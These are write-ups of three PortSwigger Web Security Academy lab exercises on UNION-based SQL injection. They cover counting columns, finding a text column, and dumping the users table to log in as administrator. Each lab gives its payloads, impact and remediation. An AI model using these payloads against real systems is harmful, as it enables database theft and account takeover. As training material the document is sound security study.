Lab 7: SQL Injection UNION Attack - Determining Number of Columns
Platform: PortSwigger Web Security Academy
Level: Practitioner
Category: SQL Injection - UNION Attacks
Status: ✅ Solved

Objective
Determine the exact number of columns returned by the original query using a UNION-based SQL injection.

Key Concept
For a UNION attack to work, the injected query must return the same number of columns as the original query. Two methods exist:

ORDER BY method
UNION SELECT NULL method


Steps to Solve
Method used — NULL method:
' UNION SELECT NULL--         (error)
' UNION SELECT NULL,NULL--    (error)
' UNION SELECT NULL,NULL,NULL-- (success ✅)
When no error appeared → 3 columns confirmed

Tool Used

Burp Suite Repeater (to test payloads quickly)
Browser


Impact
Informational — This is a reconnaissance step. By itself it doesn't extract data, but it enables further UNION attacks.

Remediation

Use parameterized queries
Implement WAF (Web Application Firewall)



Lab 8: SQL Injection UNION Attack - Finding a Column Containing Text
Platform: PortSwigger Web Security Academy
Level: Practitioner
Category: SQL Injection - UNION Attacks
Status: ✅ Solved

Objective
After finding the number of columns, identify which column accepts string (text) data so it can be used to extract information.

Key Concept
Not all columns accept string data — some may only accept integers. We need to find which column can display text output.

Steps to Solve

Already knew there were 3 columns (from Lab 7)
Tested each column position with a string value:

' UNION SELECT 'a',NULL,NULL--   (error = col 1 not string)
' UNION SELECT NULL,'a',NULL--   (success ✅ = col 2 is string)

Column 2 accepted string data — confirmed ✅


Tool Used

Burp Suite Repeater
Browser


Impact
Informational — Identifies the extraction point for UNION-based data retrieval attacks.

Remediation

Parameterized queries prevent UNION injection entirely



Lab 9: SQL Injection UNION Attack - Retrieving Data from Other Tables
Platform: PortSwigger Web Security Academy
Level: Practitioner
Category: SQL Injection - UNION Attacks
Status: ✅ Solved

Objective
Use a UNION attack to retrieve all usernames and passwords from the users table, then log in as administrator.

Steps to Solve

Confirmed 2 columns, both accept strings:

' UNION SELECT 'a','a'--

Extracted data from users table:

' UNION SELECT username,password FROM users--

Page displayed:

administrator | s3cur3p4ssw0rd
wiener | peter
carlos | montoya

Logged in as administrator using extracted credentials ✅


Tool Used

Burp Suite (Intercept + Repeater)
Browser


Impact
Critical — All user credentials extracted from the database. Complete account takeover of all users including admin.

Remediation

Parameterized queries / prepared statements
Hash all passwords (bcrypt, Argon2)
Principle of least privilege on DB user
WAF to detect UNION patterns
